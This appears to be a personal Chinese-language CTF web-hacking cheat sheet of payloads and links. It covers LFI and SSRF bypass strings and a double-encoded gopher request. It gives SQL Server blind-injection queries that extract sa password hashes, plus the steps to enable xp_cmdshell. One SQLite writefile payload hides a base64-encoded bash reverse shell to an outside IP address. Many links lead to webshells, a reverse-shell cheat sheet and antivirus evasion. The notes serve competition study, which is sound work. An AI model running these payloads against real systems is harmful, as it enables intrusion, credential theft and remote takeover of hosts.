- [Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)
- burp 挂 xray 
- exp_PayloadsAllTheThings
- vulhub 看一看

# Web

尽量使用 burp 测试, 比如 /admin/../

## 题目提示

[弱类型](./web_php_001_weaktype)

| param        | desc                           |     |
| ------------ | ------------------------------ | --- |
| ?file/?page  | LFI 文件包含                   |     |
| ?url=        | SSRF                           |     |
| 输入框       | ssti/xss/xxe                   |
| 尝试协议     | [protocol](./web_php_protocol) |
| 检查 Cookies |

fuzz

| url                                         | payload       |
| ------------------------------------------- | ------------- |
| `?name={{config}}`                          |               |
| `?file=../../../../../../prox/self/environ` | 看 secret_key |

- ssrf/发送连接时,可以本地启动nc监听试一下发送信息是否正确.
- Shiro 检测
- 发送时进行1次或多次url编码。

## 非预期想法

- 读取 ~/.bash_history 历史文件
- 读取环境变量, 2.`../../../proc/1/environ`

## Web 渗透

- 抓包密码修改，水平越权
- 文件上传 / 头像、简历
- Sql 注入

## RCE 命令绕过

包含 www.baidu.com 通过 http://user:pass@host 格式绕过 16 进制/8 进制

`www.baidu.com@127.0.0.2`

绕过 127.0.0.1 , 2-127 都可以, 8 进制

```txt
127.0.0.2
127.1
...
127.0.0.127

curl 127.0.0.0x02
ping 0x7F.0x00.0x00.0x01
ping 0x7F000001
ping 0177.0000.0000.0001
```

## SSRF

[盲 ssrf 漏洞 | 四个有趣的靶场漏洞挖掘案例](https://mp.weixin.qq.com/s/dAlvpJ5dMa5oSExV4Lsgzg)

1. 不存在路径绕过

`url=/http/../flag`

2. 通过 127.0.0.2 ... 127

3. file 读取 `/?url=file:///proc/net/arp` 然后 gopher

[2023 数字网络安全人才挑战赛 writeup by Arr3stY0u](https://mp.weixin.qq.com/s/raoRrCy00F17YefchLAfoQ)

```
url 编码两次，hackbar 发包
http://80.endpoint-23fd7089a8224c3d9a662d874963c896.s.ins.cloud.dasctf.com:81/?url=gopher://127.1:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%30%25%32%65%25%33%32%25%33%35%25%33%32%25%32%65%25%33%34%25%33%37%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%36%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%64%25%30%61%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%33%64%25%33%32%25%33%37%25%33%33%25%33%30%25%36%35%25%36%31%25%33%32%25%36%36%25%36%34%25%33%34%25%36%33%25%33%34%25%33%30%25%36%34%25%36%36%25%33%30%25%36%36%25%33%38%25%36%32%25%33%37%25%36%36%25%36%34%25%36%32%25%33%36%25%33%37%25%33%33%25%33%38%25%33%32%25%33%32%25%33%31%25%36%34%25%33%36
```

## curl 使用

curl -i -L

```txt
-i, --include       Incluude protocol response headers in the output
-L, --location      Follow redirects
```

# 文件上传

# SQL 注入

## Mysql

## SQL Server

https://www.w3schools.com/sql/sql_ref_sqlserver.asp
[ 存储过程 sql 注入； table 头注入； 安全攻防 | 四个有趣的靶场漏洞挖掘案例](https://mp.weixin.qq.com/s/dAlvpJ5dMa5oSExV4Lsgzg)

```sql
-- db name
Select Name From Master..SysDataBases Where DbId=(Select Dbid From Master..SysProcesses Where Spid = @@spid)
-- stack query
-- if else
SELECT IIF(500<1000, 'YES', 'NO');
if (1=1) waitfor delay '00:00:1' else select 2
-- blind
?id=1' waitfor delay '00:00:2'--'

-- current-user
select CURRENT_USER;
select SYSTEM_USER;
select USER_NAME();

-- functions
ascii,char,charindex,concat,concat with +,concat_ws,datalength,difference,format,left,len,lower,ltrim,nchar,patindex,quotename,replace,replicate,reverse,right,rtrim,soundex,space,str,stuff,substring,translate,trim,unicode,upper
select case when 1=1 then 0 else 2 end  -- if else
if (1<0) Begin select 'true' End Else Begin select 'false' End -- if else 2

-- sa passwords
select *  FROM master.sys.sql_logins
select *  FROM [master].[sys].[sql_logins]
SELECT name, CAST(CONVERT(varchar(max), password_hash, 1) AS varchar)  FROM master.sys.sql_logins -- 0x0102  https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver16
SELECT name, CAST(CONVERT(varchar(max), password_hash, 2) AS varchar)  FROM master.sys.sql_logins -- 0102

select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 1, 1))=48  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为0
select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 2, 1))=49  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为1


SELECT HOST_NAME()  -- 主机名
SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser -- SUSER_NAME sa
-- 在master - 视图里
```

启动 xp_cmdshell

```
sp_configure 'show advanced options',1
reconfigure
go
sp_configure 'xp_cmdshell',1
reconfigure
go
```

## Oracle

[干货 | Oracle 注入和漏洞利用姿势总结](https://mp.weixin.qq.com/s/cZdS3hgXr8JG2UPrI1S4Cg)

## sqlite

```sql
sqlite3.exe db.sqlite3 -cmd SELECT(name)FROM(sqlite_master)
# 查表名
SELECT name FROM sqlite_master WHERE type='table';
SELECT CHAR(97);  -- 'a'
SELECT HEX('a');  -- 61

-- 2022第五空间 5_Misc_m@sTeR_0f
SELECT writefile('/home/ctf/'||CHAR(46)||'sqliterc',"select readfile('/flag'||CHAR(46)||'txt')")
select sqlite_version()

select readfile('/etc/passwd')
select writefile('/home/ctf/'||(SELECT substr(sqlite_version(),2,1))||'sqliterc',
(SELECT substr(sqlite_version(),2,1)||'shell echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3Lzg4ODggMD4mMQo=|base64 -d|bash'))
```

## Quine 输入=输出

[『CTF』 一次比赛中的 Quine 注入](https://mp.weixin.qq.com/s/zcUgSo825aXINv_IwIvMdg)

# Python

```
{0.__class__.__init__.__globals__}
```

# Javascript

弱类型

```ts
[]  ==  0   // true
[]  ==  ''  // true
[2] ==  2   // true
[0] ==  0   // true
[0] == "0"  // true
[0] ==="0"  // false
"0" !== [0] // true
123+"hello"    // '123hello'
[123]+"hello"  // '123hello'
"123"+"hello"  // '123hello'
```

# Article

[无字母数字 RCE 初探](http://www.m0x01sery.com/2022/03/28/rce-without-w-and-n/)
[Web 安全-RCE 代码及命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzkzNzQyMDkxMQ==&mid=2247485274&idx=1&sn=590247ec93cd869b37e11f4d4208fd42)

[【安全练兵场】| BurpSuite 靶场系列之 SQL 注入](https://mp.weixin.qq.com/s/RqB-vMifxn0-4hrn0OEoHQ)
[【安全练兵场】| BurpSuite 靶场系列之身份验证](https://mp.weixin.qq.com/s/wDWcdTdFRkI8cMK1_pv94w)

[详解 PHP 弱类型安全问题](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247494684&idx=1&sn=8264be9d89d29cc3c2c493b9aaa8d35f)
[Bypass_disable_function 总结](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247493192&idx=1&sn=e6ec9ea78e2faccc013787376aced1cc)
[bypass\_无参数读文件和 RCE 的利用](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247492577&idx=1&sn=3011d1eebe62226644ad83e9f6fee67a)
[Android-Webview 中的漏洞利用总结](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247493433&idx=1&sn=c7f12e2b2afa2b57a9c663d272c40511)
[SQLite 注入](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247492558&idx=1&sn=9f77c3df6508345194b6646f31cc4b29)
[Java | JDBC 反序列化漏洞分析 & POC 编写](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247491462&idx=1&sn=8846b0f6a7ec694ff14722a78bc079d0)
[Java | JDK8 从任意文件写到远程命令执行](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247493744&idx=1&sn=e3661151be5be5d88d41b8c88326841c)

## 学习分享

[MiniNep Web 组 2023 第一周-1-哔哩哔哩](https://www.bilibili.com/video/BV1qv4y1L7Qp)

## PHP

[PHP 原生类在安全方面的利用总结 | echo new a(b) | Error/Exception 内置类绕过哈希比较 | SoapClient 类进行 SSRF | SimpleXMLElement 类进行 XXE](https://mp.weixin.qq.com/s/CDNU1RgfeliURN69UZqCTA)

## rce

[无字母数字 Webshell&&冰蝎 Webshell](https://mp.weixin.qq.com/s/1PX7_nU7bmqOs3lGb8O8gw)
[一些 RCE 的汇总](http://www.yaotu.net/biancheng/120663.html)

## SRC

[Java 代码分析工具 Tabby 在 CTF 中的运用](https://mp.weixin.qq.com/s/u7RuSmBHy76R7_PqL8WJww)
[挖洞思路：前端源码泄露漏洞并用 source map 文件还原](https://blog.csdn.net/qq_44930903/article/details/124257571)

## 工具/马

[java 内存马](https://github.com/su18/ysoserial)
[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
[史上最全一句话木马](https://mp.weixin.qq.com/s/o_HUnlubJdPRdQdpnMJeEw)
[ChatGPT 写了“木马”](https://mp.weixin.qq.com/s/C3taCJVQP0RwNSBXoBnJFg)

## 代码审计

[DreamerCMS 代码审计](https://n1k0la-t.github.io/2023/01/31/DreamerCMS代码审计/)
[记一次较为详细的某 CMS 代码审计](https://mp.weixin.qq.com/s/WXvbSAZ2HkLWxgqpvwQOcg)
[【代码审计】若依后台管理系统](https://mp.weixin.qq.com/s/ITt-_ntxOu0ArwNQ1tjXQg)

## 免杀

[免杀学习——PHP 免杀](https://blog.csdn.net/ZxC789456302/article/details/127473366): 白白白无-免杀学习——PHP 免杀----🔥 热度:9113
[jsp](https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/Runtime-reflect-cmd.jsp)

## SQLi

[2022 年最佳 SQL 注入检测工具【文末抽书】](https://mp.weixin.qq.com/s/2clT1zX9s8RXpMPsRK5zyg)
[nosql 注入用户名密码爆破工具](https://0xmrm.com/272.html)

## ssti

https://blog.csdn.net/miuzzx/article/details/127744431#t4
[CTF 中 SSTI 漏洞的简单利用](https://mp.weixin.qq.com/s/pA-ca-b0IYszwjmkCIdYBg)
[SSTI 绕过 | [GDOUCTF 2023]<ez_ze>](https://www.nssctf.cn/problem/3745) [参考文章](https://zhuanlan.zhihu.com/p/619441473)

## AWD

[Web AWD 竞赛的攻击与防御技巧](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247493468&idx=1&sn=507cbbb3809c19ad4d16475904bf8001)
